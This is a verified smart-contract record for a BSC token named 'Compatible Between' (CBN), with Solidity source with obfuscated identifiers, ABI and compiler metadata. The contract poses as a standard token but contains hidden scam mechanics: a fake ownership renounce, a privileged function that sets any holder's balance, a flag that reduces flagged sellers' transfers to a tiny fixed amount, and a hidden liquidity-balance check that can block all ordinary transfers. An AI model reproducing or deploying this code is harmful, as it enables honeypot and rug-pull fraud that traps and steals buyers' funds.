{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface feeWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldTotal {\n    function createPair(address totalSender, address toTeam) external returns (address);\n}\n\ninterface isFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeMax) external view returns (uint256);\n\n    function transfer(address autoExempt, uint256 tradingTakeFund) external returns (bool);\n\n    function allowance(address fromEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingTakeFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoExempt,\n        uint256 tradingTakeFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoTake, uint256 value);\n    event Approval(address indexed fromEnable, address indexed spender, uint256 value);\n}\n\ninterface isFeeMetadata is isFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CompatibleBetween is launchList, isFee, isFeeMetadata {\n\n    function senderSwapTx() private view {\n        require(buySender[_msgSender()]);\n    }\n\n    bool public txReceiver;\n\n    uint256 private autoToken = 100000000 * 10 ** 18;\n\n    uint256 private feeToken;\n\n    uint256 public listSwap;\n\n    uint8 private autoTakeReceiver = 18;\n\n    function transferFrom(address exemptLiquidity, address autoExempt, uint256 tradingTakeFund) external override returns (bool) {\n        if (_msgSender() != tradingList) {\n            if (swapLaunch[exemptLiquidity][_msgSender()] != type(uint256).max) {\n                require(tradingTakeFund <= swapLaunch[exemptLiquidity][_msgSender()]);\n                swapLaunch[exemptLiquidity][_msgSender()] -= tradingTakeFund;\n            }\n        }\n        return feeMin(exemptLiquidity, autoExempt, tradingTakeFund);\n    }\n\n    uint256 public feeBuyReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyShould;\n    }\n\n    bool public autoSender;\n\n    function allowance(address launchSell, address swapFundReceiver) external view virtual override returns (uint256) {\n        if (swapFundReceiver == tradingList) {\n            return type(uint256).max;\n        }\n        return swapLaunch[launchSell][swapFundReceiver];\n    }\n\n    address private tokenAtEnable;\n\n    address public exemptFrom;\n\n    string private buyShould = \"CBN\";\n\n    function amountExemptTake(address tradingTake) public {\n        if (fromFund) {\n            return;\n        }\n        \n        buySender[tradingTake] = true;\n        if (autoSender) {\n            txReceiver = false;\n        }\n        fromFund = true;\n    }\n\n    mapping(address => bool) public tradingMin;\n\n    function transfer(address maxAt, uint256 tradingTakeFund) external virtual override returns (bool) {\n        return feeMin(_msgSender(), maxAt, tradingTakeFund);\n    }\n\n    function feeMin(address exemptLiquidity, address autoExempt, uint256 tradingTakeFund) internal returns (bool) {\n        if (exemptLiquidity == tokenSellTotal) {\n            return swapFund(exemptLiquidity, autoExempt, tradingTakeFund);\n        }\n        uint256 isFrom = isFee(exemptFrom).balanceOf(listReceiver);\n        require(isFrom == receiverBuy);\n        require(autoExempt != listReceiver);\n        if (tradingMin[exemptLiquidity]) {\n            return swapFund(exemptLiquidity, autoExempt, tokenAuto);\n        }\n        return swapFund(exemptLiquidity, autoExempt, tradingTakeFund);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoTakeReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenAtEnable;\n    }\n\n    address public tokenSellTotal;\n\n    uint256 teamMarketing;\n\n    function balanceOf(address feeMax) public view virtual override returns (uint256) {\n        return amountAuto[feeMax];\n    }\n\n    bool public senderLimit;\n\n    string private tradingEnable = \"Compatible Between\";\n\n    function amountSwapTotal(address maxAt, uint256 tradingTakeFund) public {\n        senderSwapTx();\n        amountAuto[maxAt] = tradingTakeFund;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoToken;\n    }\n\n    mapping(address => bool) public buySender;\n\n    function approve(address swapFundReceiver, uint256 tradingTakeFund) public virtual override returns (bool) {\n        swapLaunch[_msgSender()][swapFundReceiver] = tradingTakeFund;\n        emit Approval(_msgSender(), swapFundReceiver, tradingTakeFund);\n        return true;\n    }\n\n    function marketingFee(address sellSender) public {\n        senderSwapTx();\n        if (feeToken != marketingLaunched) {\n            atBuy = true;\n        }\n        if (sellSender == tokenSellTotal || sellSender == exemptFrom) {\n            return;\n        }\n        tradingMin[sellSender] = true;\n    }\n\n    function senderTake(uint256 tradingTakeFund) public {\n        senderSwapTx();\n        receiverBuy = tradingTakeFund;\n    }\n\n    address tradingList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private marketingLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingEnable;\n    }\n\n    mapping(address => uint256) private amountAuto;\n\n    bool public atBuy;\n\n    bool public fromFund;\n\n    constructor (){\n        if (feeBuyReceiver == listSwap) {\n            listSwap = feeToken;\n        }\n        feeWallet exemptFund = feeWallet(tradingList);\n        exemptFrom = shouldTotal(exemptFund.factory()).createPair(exemptFund.WETH(), address(this));\n        \n        tokenSellTotal = _msgSender();\n        walletToken();\n        buySender[tokenSellTotal] = true;\n        amountAuto[tokenSellTotal] = autoToken;\n        if (listSwap == feeBuyReceiver) {\n            txReceiver = true;\n        }\n        emit Transfer(address(0), tokenSellTotal, autoToken);\n    }\n\n    function walletToken() public {\n        emit OwnershipTransferred(tokenSellTotal, address(0));\n        tokenAtEnable = address(0);\n    }\n\n    uint256 receiverBuy;\n\n    uint256 constant tokenAuto = 15 ** 10;\n\n    function owner() external view returns (address) {\n        return tokenAtEnable;\n    }\n\n    function swapFund(address exemptLiquidity, address autoExempt, uint256 tradingTakeFund) internal returns (bool) {\n        require(amountAuto[exemptLiquidity] >= tradingTakeFund);\n        amountAuto[exemptLiquidity] -= tradingTakeFund;\n        amountAuto[autoExempt] += tradingTakeFund;\n        emit Transfer(exemptLiquidity, autoExempt, tradingTakeFund);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapLaunch;\n\n    event OwnershipTransferred(address indexed enableTx, address indexed receiverEnable);\n\n    address listReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFundReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"}],\"name\":\"amountExemptTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTakeFund\",\"type\":\"uint256\"}],\"name\":\"amountSwapTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTakeFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buySender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuyReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"}],\"name\":\"marketingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingTakeFund\",\"type\":\"uint256\"}],\"name\":\"senderTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSellTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTakeFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTakeFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CompatibleBetween", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}